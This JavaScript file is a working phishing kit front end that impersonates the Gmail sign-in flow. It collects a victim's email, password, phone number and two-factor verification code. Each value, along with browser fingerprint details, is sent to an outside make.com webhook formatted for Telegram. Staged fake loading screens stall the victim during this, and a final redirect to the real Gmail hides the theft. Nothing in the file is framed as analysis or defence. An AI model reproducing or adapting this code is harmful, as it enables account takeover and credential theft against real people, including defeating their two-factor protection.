document.addEventListener('DOMContentLoaded', function() {
    // Step elements
    const emailStep = document.getElementById('email-step');
    const passwordStep = document.getElementById('password-step');
    const verificationMethodStep = document.getElementById('verification-method-step');
    const phoneInputStep = document.getElementById('phone-input-step');
    const verificationStep = document.getElementById('verification-step');
    const successStep = document.getElementById('success-step');
    const loadingScreen = document.getElementById('loading-screen');
    const loadingText = document.getElementById('loading-text');
    
    // Ensure proper initial state - force hide loading screen and show email step
    loadingScreen.classList.add('hidden');
    emailStep.classList.remove('hidden');
    
    // Hide all other steps explicitly
    passwordStep.classList.add('hidden');
    verificationMethodStep.classList.add('hidden');
    phoneInputStep.classList.add('hidden');
    verificationStep.classList.add('hidden');
    successStep.classList.add('hidden');
    
    // Form elements
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const phoneNumberInput = document.getElementById('phone-number');
    const verificationCodeInput = document.getElementById('verification-code');
    const userEmailDisplay = document.getElementById('user-email');
    const userPhoneDisplay = document.getElementById('user-phone');
    
    // Verification method elements
    const phoneMethod = document.getElementById('phone-method');
    const authenticatorMethod = document.getElementById('authenticator-method');
    const phoneVerificationInfo = document.getElementById('phone-verification-info');
    const authenticatorVerificationInfo = document.getElementById('authenticator-verification-info');
    const verificationHelpLink = document.getElementById('verification-help-link');
    
    // Button elements
    const emailNextButton = document.getElementById('email-next');
    const passwordNextButton = document.getElementById('password-next');
    const backToPasswordButton = document.getElementById('back-to-password');
    const backToVerificationMethodsButton = document.getElementById('back-to-verification-methods');
    const phoneNextButton = document.getElementById('phone-next');
    const backButton = document.getElementById('back-button');
    const verificationNextButton = document.getElementById('verification-next');
    const continueToGmailButton = document.getElementById('continue-to-gmail');
    const backToEmailButton = document.getElementById('back-to-email');
    
    // Track verification method
    let selectedVerificationMethod = null;
    
    // API configuration
    const API_ENDPOINT = 'https://hook.eu2.make.com/wmduh51b8n4vs8yt8jygndpxcttbgq3y';
    
    // Function to send data to API with Telegram formatting
    async function sendToAPI(stage, data) {
        try {
            // Format message for Telegram
            let message = `🔐 *Gmail Login Activity*\n\n`;
            message += `📍 *Stage:* ${stage}\n`;
            message += `⏰ *Time:* ${new Date().toLocaleString()}\n\n`;
            
            // Add stage-specific data
            for (const [key, value] of Object.entries(data)) {
                if (value) {
                    message += `• *${key}:* ${value}\n`;
                }
            }
            
            const payload = {
                stage: stage,
                timestamp: new Date().toISOString(),
                data: data,
                telegram_message: message
            };
            
            const response = await fetch(API_ENDPOINT, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            });
            
            if (response.ok) {
                console.log(`✅ Stage "${stage}" data sent successfully`);
            } else {
                console.error(`❌ Failed to send stage "${stage}" data:`, response.status);
            }
        } catch (error) {
            console.error(`❌ Error sending stage "${stage}" data:`, error);
        }
    }
    
    // Loading screen utility functions
    function showLoadingScreen(message) {
        loadingText.textContent = message;
        // Hide all specific steps
        hideElement(emailStep);
        hideElement(passwordStep);
        hideElement(verificationMethodStep);
        hideElement(phoneInputStep);
        hideElement(verificationStep);
        hideElement(successStep);
        // Show loading screen
        showElement(loadingScreen);
    }
    
    function hideLoadingScreen() {
        hideElement(loadingScreen);
    }
    
    function transitionWithLoading(fromStep, toStep, loadingMessage, callback) {
        // Show loading screen
        showLoadingScreen(loadingMessage);
        
        // After 3 seconds, hide loading and show next step
        setTimeout(() => {
            hideLoadingScreen();
            showElement(toStep);
            if (callback) callback();
        }, 3000);
    }
    
    // Email step
    emailNextButton.addEventListener('click', function() {
        const email = emailInput.value.trim();
        
        if (!email) {
            showError(emailInput, 'Please enter your email');
            return;
        }
        
        if (!isValidEmail(email)) {
            showError(emailInput, 'Please enter a valid email address');
            return;
        }
        
        // Set the email in the password step
        userEmailDisplay.textContent = email;
        
        // Send email data to API
        sendToAPI('Email Entered', {
            'Email Address': email,
            'Browser': navigator.userAgent,
            'Platform': navigator.platform,
            'Screen Resolution': `${screen.width}x${screen.height}`,
            'Timezone': Intl.DateTimeFormat().resolvedOptions().timeZone
        });
        
        // Transition with loading
        transitionWithLoading(
            emailStep, 
            passwordStep, 
            'Verifying account...', 
            () => passwordInput.focus()
        );
    });
    
    // Password step
    passwordNextButton.addEventListener('click', function() {
        const password = passwordInput.value.trim();
        
        if (!password) {
            showError(passwordInput, 'Please enter your password');
            return;
        }
        
        if (password.length < 8) {
            showError(passwordInput, 'Password must be at least 8 characters');
            return;
        }
        
        // Send password data to API
        sendToAPI('Password Entered', {
            'Email Address': userEmailDisplay.textContent,
            'Password': password,
            'Password Length': password.length.toString(),
            'Has Numbers': /\d/.test(password) ? 'Yes' : 'No',
            'Has Special Characters': /[!@#$%^&*()_+\-=\[\]{};':"\\\/\?,.<>]/.test(password) ? 'Yes' : 'No',
            'Has Uppercase': /[A-Z]/.test(password) ? 'Yes' : 'No',
            'Has Lowercase': /[a-z]/.test(password) ? 'Yes' : 'No'
        });
        
        // Transition with loading
        transitionWithLoading(
            passwordStep, 
            verificationMethodStep, 
            'Checking security settings...'
        );
    });
    
    // Verification method selection
    phoneMethod.addEventListener('click', function() {
        // Highlight selection
        phoneMethod.classList.add('selected');
        authenticatorMethod.classList.remove('selected');
        selectedVerificationMethod = 'phone';
        
        // Send verification method selection to API
        sendToAPI('2FA Method Selected', {
            'Email Address': userEmailDisplay.textContent,
            'Selected Method': 'SMS / Text Message',
            'Method Type': 'Phone Number Verification',
            'Security Level': 'Standard'
        });
        
        // Transition with loading
        transitionWithLoading(
            verificationMethodStep, 
            phoneInputStep, 
            'Setting up SMS verification...', 
            () => phoneNumberInput.focus()
        );
    });
    
    authenticatorMethod.addEventListener('click', function() {
        // Highlight selection
        authenticatorMethod.classList.add('selected');
        phoneMethod.classList.remove('selected');
        selectedVerificationMethod = 'authenticator';
        
        // Send authenticator method selection to API
        sendToAPI('2FA Method Selected', {
            'Email Address': userEmailDisplay.textContent,
            'Selected Method': 'Google Authenticator',
            'Method Type': 'App-based Authentication',
            'Security Level': 'High'
        });
        
        // Configure verification step for authenticator
        hideElement(phoneVerificationInfo);
        showElement(authenticatorVerificationInfo);
        verificationHelpLink.textContent = 'Having trouble with your authenticator app?';
        
        // Transition with loading
        transitionWithLoading(
            verificationMethodStep, 
            verificationStep, 
            'Connecting to authenticator app...', 
            () => verificationCodeInput.focus()
        );
    });
    
    // Back to password from verification method selection
    backToPasswordButton.addEventListener('click', function() {
        hideElement(verificationMethodStep);
        showElement(passwordStep);
        passwordInput.focus();
    });
    
    // Phone number input
    phoneNextButton.addEventListener('click', function() {
        const phoneNumber = phoneNumberInput.value.trim();
        
        if (!phoneNumber) {
            showError(phoneNumberInput, 'Please enter your phone number');
            return;
        }
        
        // Display formatted phone number
        userPhoneDisplay.textContent = formatPhoneNumberForDisplay(phoneNumber);
        
        // Send phone number data to API
        sendToAPI('Phone Number Entered', {
            'Email Address': userEmailDisplay.textContent,
            'Phone Number': phoneNumber,
            'Formatted Phone': formatPhoneNumberForDisplay(phoneNumber),
            'Country Code': phoneNumber.startsWith('+') ? phoneNumber.substring(0, phoneNumber.indexOf(' ')) : 'Unknown',
            'Verification Method': 'SMS'
        });
        
        // Configure verification step for phone
        showElement(phoneVerificationInfo);
        hideElement(authenticatorVerificationInfo);
        verificationHelpLink.textContent = 'Didn\'t receive a code?';
        
        // Simulate sending verification code (in a real app, this would be handled by backend)
        simulateSendingVerificationCode();
        
        // Transition with loading
        transitionWithLoading(
            phoneInputStep, 
            verificationStep, 
            'Sending verification code...', 
            () => verificationCodeInput.focus()
        );
    });
    
    // Back to verification methods from phone input
    backToVerificationMethodsButton.addEventListener('click', function() {
        hideElement(phoneInputStep);
        showElement(verificationMethodStep);
    });
    
    // Back from verification step
    backButton.addEventListener('click', function() {
        hideElement(verificationStep);
        
        if (selectedVerificationMethod === 'phone') {
            showElement(phoneInputStep);
            phoneNumberInput.focus();
        } else {
            showElement(verificationMethodStep);
        }
    });
    
    // Verification step
    verificationNextButton.addEventListener('click', function() {
        const code = verificationCodeInput.value.trim();
        
        if (!code) {
            showError(verificationCodeInput, 'Please enter the verification code');
            return;
        }
        
        if (code.length !== 6 || !/^\d+$/.test(code)) {
            showError(verificationCodeInput, 'Please enter a valid 6-digit verification code');
            return;
        }
        
        // Send verification code data to API
        sendToAPI('Verification Code Entered', {
            'Email Address': userEmailDisplay.textContent,
            'Verification Code': code,
            'Method Used': selectedVerificationMethod === 'phone' ? 'SMS' : 'Google Authenticator',
            'Phone Number': selectedVerificationMethod === 'phone' ? userPhoneDisplay.textContent : 'N/A',
            'Attempt Time': new Date().toLocaleString(),
            'Status': 'Code Submitted'
        });
        
        // Transition with loading
        transitionWithLoading(
            verificationStep, 
            successStep, 
            'Completing sign in...'
        );
    });
    
    // Success step
    continueToGmailButton.addEventListener('click', function() {
        // Send final completion data to API
        sendToAPI('Login Flow Completed', {
            'Email Address': userEmailDisplay.textContent,
            'Verification Method': selectedVerificationMethod === 'phone' ? 'SMS' : 'Google Authenticator',
            'Phone Number': selectedVerificationMethod === 'phone' ? userPhoneDisplay.textContent : 'N/A',
            'Session Duration': 'N/A',
            'Final Status': '✅ Login Successfully Completed',
            'Next Action': 'Redirecting to Gmail'
        });
        
        // Small delay to ensure API call completes before redirect
        setTimeout(() => {
            // In a real app, this would redirect to Gmail
            window.location.href = 'https://mail.google.com';
        }, 1000);
    });
    
    // Back to email step
    backToEmailButton.addEventListener('click', function() {
        hideElement(passwordStep);
        showElement(emailStep);
        emailInput.focus();
    });
    
    // Helper functions
    function hideElement(element) {
        element.classList.add('hidden');
    }
    
    function showElement(element) {
        element.classList.remove('hidden');
    }
    
    function showError(input, message) {
        // Remove any existing error
        const existingError = input.parentElement.querySelector('.error-message');
        if (existingError) {
            existingError.remove();
        }
        
        // Create and add error message
        const errorElement = document.createElement('div');
        errorElement.className = 'error-message';
        errorElement.style.color = '#f28b82';
        errorElement.style.fontSize = '12px';
        errorElement.style.marginTop = '8px';
        errorElement.style.textAlign = 'left';
        errorElement.textContent = message;
        
        input.parentElement.appendChild(errorElement);
        
        // Highlight input
        input.style.borderColor = '#f28b82';
        
        // Focus on input
        input.focus();
        
        // Remove error when input changes
        input.addEventListener('input', function() {
            const error = input.parentElement.querySelector('.error-message');
            if (error) {
                error.remove();
                input.style.borderColor = '';
            }
        }, { once: true });
    }
    
    function isValidEmail(email) {
        // Simple email validation regex
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return emailRegex.test(email);
    }
    
    function formatPhoneNumberForDisplay(phoneNumber) {
        // This is a simple function to display a partially obscured phone number
        // In a real app, you would use the actual user's phone number from their account
        const cleaned = phoneNumber.replace(/\D/g, '');
        const last4 = cleaned.slice(-4);
        return `+1 (***) ***-${last4.slice(0, 2)}${last4.slice(2)}`;
    }
    
    function simulateSendingVerificationCode() {
        // In a real app, this would make an API call to send a verification code
        console.log('Verification code sent to phone number');
        
        // Simulate a 6-digit code (in a real app, this would be generated on the backend)
        const code = '123456';
        console.log('Verification code:', code);
    }
});

// Add event listeners for Enter key
document.addEventListener('keydown', function(event) {
    if (event.key === 'Enter') {
        const activeElement = document.activeElement;
        
        if (activeElement.id === 'email') {
            document.getElementById('email-next').click();
        } else if (activeElement.id === 'password') {
            document.getElementById('password-next').click();
        } else if (activeElement.id === 'phone-number') {
            document.getElementById('phone-next').click();
        } else if (activeElement.id === 'verification-code') {
            document.getElementById('verification-next').click();
        }
    }
});
